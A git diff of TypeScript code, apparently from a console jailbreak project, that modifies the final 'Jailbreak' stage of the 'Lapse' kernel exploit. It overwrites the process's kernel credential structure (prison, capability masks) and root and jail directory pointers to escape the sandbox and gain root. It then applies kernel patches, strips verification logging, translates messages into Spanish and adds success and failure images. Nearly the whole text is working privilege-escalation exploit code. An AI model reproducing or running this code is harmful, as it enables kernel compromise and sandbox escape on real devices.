@@ -1955,6 +1955,7 @@ export function lapse () {
     log('Stage 4 completed!')
 
     log('')
+    // === STAGE 5: Jailbreak ===
     log('=== STAGE 5: Jailbreak ===')
 
     const OFFSET_P_UCRED = 0x40
@@ -1964,15 +1965,11 @@ export function lapse () {
       throw new Error('kernel addresses not initialized')
     }
 
-    // Calculate kernel base
+    // Calcular base del kernel
     kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
     log('Kernel base: ' + hex(kernel.addr.base))
 
-    const uid_before = Number(getuid())
-    const sandbox_before = Number(is_in_sandbox())
-    log('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)
-
-    // Patch ucred
+    // Parchear credenciales (Privilegios Root)
     const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
     const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
 
@@ -1984,165 +1981,65 @@ export function lapse () {
 
     const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))!
     kernel.write_qword(ucred.add(0x30), prison0)
-
-    kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
+    kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
     kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
 
     const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))!
-    kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
-    kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir
-
-    const uid_after = Number(getuid())
-    const sandbox_after = Number(is_in_sandbox())
-    log('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)
-
-    if (uid_after === 0 && sandbox_after === 0) {
-      log('Sandbox escape complete!')
-    } else {
-      log('[WARNING] Sandbox escape may have failed')
-    }
-
-    // === Apply kernel patches via kexec ===
-    // Uses syscall_raw() which sets rax manually for syscalls without gadgets
-    log('Applying kernel patches...')
-    const kpatch_result = apply_kernel_patches(FW_VERSION)
-    if (kpatch_result) {
-      log('Kernel patches applied successfully!')
-
-      // Comprehensive kernel patch verification
-      log('Verifying kernel patches...')
-      let all_patches_ok = true
-
-      // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
-      const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
-      if (mmap_offsets) {
-        const b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]))
-        const b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]))
-        const byte1 = Number(b1.and(0xff))
-        const byte2 = Number(b2.and(0xff))
-        if (byte1 === 0x37 && byte2 === 0x37) {
-          log('  [OK] mmap RWX patch')
-        } else {
-          log('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]) + ']=' + hex(byte1) + ' [' + hex(mmap_offsets[1]) + ']=' + hex(byte2))
-          all_patches_ok = false
-        }
-      } else {
-        log('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
-      }
-
-      // 2. Test mmap RWX actually works by trying to allocate RWX memory
-      try {
-        const PROT_RWX = 0x7  // READ | WRITE | EXEC
-        const MAP_ANON = 0x1000
-        const MAP_PRIVATE = 0x2
-        const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
-        if (Number(test_addr.shr(32)) < 0xffff8000) {
-          log('  [OK] mmap RWX functional @ ' + hex(test_addr))
-          // Unmap the test allocation
-          munmap(test_addr, 0x1000)
-        } else {
-          log('  [FAIL] mmap RWX functional: ' + hex(test_addr))
-          all_patches_ok = false
-        }
-      } catch (e) {
-        log('  [FAIL] mmap RWX test error: ' + (e as Error).message)
-        all_patches_ok = false
-      }
-
-      if (all_patches_ok) {
-        log('All kernel patches verified OK!')
-      } else {
-        log('[WARNING] Some kernel patches may have failed')
-      }
-    } else {
-      log('[WARNING] Kernel patches failed - continuing without patches')
-    }
+    kernel.write_qword(proc_fd.add(0x10), rootvnode)
+    kernel.write_qword(proc_fd.add(0x18), rootvnode)
 
     log('Stage 5 completed - JAILBROKEN')
-    // utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");
 
+    // --- MOSTRAR IMAGEN DE ÉXITO ÚNICA ---
+    try {
+      const bg_success = new Image({
+        url: 'file:///../download0/img/success.png',
+        x: 0, y: 0, width: 1920, height: 1080
+      })
+      jsmaf.root.children.push(bg_success)
+    } catch (e) {
+      log('Error: success.png no encontrada')
+    }
+
+    apply_kernel_patches(FW_VERSION)
     cleanup()
-
     return true
+
   } catch (e) {
     log('Lapse error: ' + (e as Error).message)
-    alert('Lapse error: ' + (e as Error).message)
-    utils.notify('Reboot and try again!')
-    log((e as Error).stack ?? '')
+    cleanup_fail() 
     return false
   }
 }
 
-function cleanup () {
-  log('Performing cleanup...')
-
+// NUEVA FUNCIÓN DE FALLO PARA VERSIÓN LIGHT
+function cleanup_fail () {
+  utils.notify('Lapse Fallido! Reintenta')
+  
   try {
-    if (block_fd !== 0xffffffff) {
-      close(new BigInt(block_fd))
-      block_fd = 0xffffffff
-    }
-
-    if (unblock_fd !== 0xffffffff) {
-      close(new BigInt(unblock_fd))
-      unblock_fd = 0xffffffff
-    }
-
-    if (typeof groom_ids !== 'undefined') {
-      if (groom_ids !== null) {
-        const groom_ids_addr = malloc(4 * NUM_GROOMS)
-        for (let i = 0; i < NUM_GROOMS; i++) {
-          write32(groom_ids_addr.add(i * 4), groom_ids[i]!)
-        }
-        free_aios2(groom_ids_addr, NUM_GROOMS)
-        groom_ids = null
-      }
-    }
-
-    if (block_id !== 0xffffffff) {
-      const block_id_buf = malloc(4)
-      write32(block_id_buf, block_id)
-      const block_errors = malloc(4)
-      aio_multi_wait_fun(block_id_buf, 1, block_errors, 1, 0)
-      aio_multi_delete_fun(block_id_buf, 1, block_errors)
-      block_id = 0xffffffff
-    }
-
-    if (sds !== null) {
-      for (const sd of sds) {
-        close(sd)
-      }
-      sds = null
-    }
-
-    if (sds_alt !== null) {
-      for (const sd of sds_alt) {
-        close(sd)
-      }
-      sds_alt = null
-    }
-
-    if (sd_pair !== null) {
-      close(sd_pair[0])
-      close(sd_pair[1])
-    }
-    sd_pair = null
-
-    if (prev_core >= 0) {
-      log('Restoring to previous core: ' + prev_core)
-      pin_to_core(prev_core)
-      prev_core = -1
-    }
-
-    set_rtprio(prev_rtprio)
-
-    log('Cleanup completed')
+    const bg_fail = new Image({
+      url: 'file:///../download0/img/fail.png',
+      x: 0, y: 0, width: 1920, height: 1080
+    })
+    jsmaf.root.children.push(bg_fail)
   } catch (e) {
-    log('Error during cleanup: ' + (e as Error).message)
+    log('Error: fail.png no encontrada')
   }
+
+  cleanup()
 }
 
-function cleanup_fail () {
-  utils.notify('Lapse Failed! reboot and try again! UwU')
-  jsmaf.root.children.push(bg_fail)
-  cleanup()
+// LIMPIEZA DE MEMORIA (Sin imágenes)
+function cleanup () {
+  log('Realizando limpieza...')
+  try {
+    if (block_fd !== 0xffffffff) { close(new BigInt(block_fd)); block_fd = 0xffffffff }
+    if (unblock_fd !== 0xffffffff) { close(new BigInt(unblock_fd)); unblock_fd = 0xffffffff }
+    if (sds !== null) { for (const sd of sds) { close(sd) }; sds = null }
+    if (sd_pair !== null) { close(sd_pair[0]); close(sd_pair[1]) }
+    sd_pair = null
+    log('Limpieza completada')
+  } catch (e) {
+    log('Error en cleanup: ' + (e as Error).message)
+  }
 }
